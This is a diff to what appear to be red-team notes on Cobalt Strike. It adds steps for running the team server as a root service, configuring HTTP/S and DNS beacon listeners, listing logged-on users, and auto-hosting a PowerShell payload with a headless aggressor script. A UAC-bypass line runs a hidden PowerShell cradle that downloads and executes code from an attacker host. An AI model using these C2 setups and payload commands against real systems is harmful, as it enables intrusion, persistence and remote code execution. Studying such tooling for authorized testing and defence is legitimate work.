@@ -45,6 +45,42 @@ Verify the server's fingerprint before connecting.
 
 > **OPSEC Note:** The team server allows multiple clients to connect at the same time. If remote team members needs to connect, you shouldn't expose port 50050 directly to internet. Use a secure remote access solution such as SSH or VPN.
 
+## Running as a Service
+
+Running the team server as a service allows us to start it automatically when the server starts up.
+
+First we need to create the following file `/etc/systemd/system/teamserver.service`:
+
+```
+[Unit]
+Description=Cobalt Strike Team Server
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+WorkingDirectory=/home/user/cobaltstrike
+ExecStart=/home/user/cobaltstrike/teamserver 10.10.10.10 password c2-profiles/normal/webbug.profile
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Next, reload the systemd manager and check run teh service.
+
+```
+sudo systemctl daemon-reload
+sudo systemctl start teamserver.service
+```
+
+Finally, the server should start on boot.
+
+```
+sudo systemctl enable teamserver.service
+```
 
 # Listeners
 
@@ -52,13 +88,46 @@ A listener is a host/port/protocol combination that listens for inconming commun
 
 There are two types:
 
-* **Egress**: This listener acts like a web server, where the Team Server and the Beacon will encapsulate their communication over HTTP protocol. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile.
+* **Egress**: Allow beacons to communicate outside of the target network to our team server.  The default egreess listener types are HTTP/S and DNS. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile.
 
-* **Peer-to-peer**: Allow beaacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly.
+* **Peer-to-peer**: Allow beacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly.
 
 In order to create a listener go to `Cobalt Strike -> Listeners` and click the button `Add`.
 
 ![](/hackingnotes/images/cobaltstrike-listener.png)
+
+## Egress Listeners
+
+### HTTP/S
+
+The HTTP listener allows beacon to send and receive C2 messages over HTTP GET and POST requests. 
+
+### DNS
+
+The DNS listener allows Beacon to send and receive C2 messages over several Lookup/Response types including A,AAAA and TXT.
+
+TXT are used by default because they can hold the most amount of data. This requires to create one ore more DNS records for adomain that the team server will be authorative for.
+
+Above an example:
+
+| **Name** | **Type** |     **Data**    |
+|:--------:|:--------:|:---------------:|
+|     @    |     A    |   10.10.10.10   |
+|    ns1   |     A    |   10.10.10.10   |
+|   pics   |    NS    | ns1.example.com |
+
+
+The DNS Beacon can then preform lookup requests, such as `<c2data>.pics.example.com`, which will be routed over the internet's DNS infrastructure.
+
+After adding the beacon with the DNS Resolver `pics.example.com` we can check it:
+
+```
+$ dig @ns1.example.com test.pics.example.com +short
+0.0.0.0
+```
+
+> **OPSEC Alert**: `0.0.0.0` is the default response, it can be changed in the Malleable C2 Profile.
+
 
 ## Peer-to-Peer (P2P) listeners
 
@@ -459,7 +528,13 @@ beacon> jobs
 
 beacon> jobkill 1
 ```
+# User Sessions
 
+We can check which users are currently logged on the compromised machine.
+
+```
+beacon> net logons
+```
 
 # Bypass UAC
 
@@ -523,4 +598,41 @@ Example:
 
 ```
 beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/b'))"
+```
+
+# Headless Colbalt Strike
+
+When the team server starts the listeners we had running are started, but any hosted files we had, this could be a problem during persistence mechanisms.
+
+We can use a headless Cobalt strike client via the `agscript` utility, to execute an agressor script on start up.
+
+```
+agscript [host] [port] [user] [password]
+```
+
+Create a `host_payloads.cna` with the follwoing content:
+
+```
+# Connected and ready
+on ready {
+
+    # Generate payload
+    $payload = artifact_payload("http", "powershell", "x64");
+
+    # Host payload
+    site_host("10.10.10.10", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
+
+}
+```
+
+You can test the script with:
+
+```
+agscript 127.0.0.1 50050 headless password host_payloads.cna
+```
+
+Finally add this to our existing startup service.
+
+```
+ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/user/cobaltstrike/agscript 127.0.0.1 50050 headless password host_payloads.cna &'
 ```
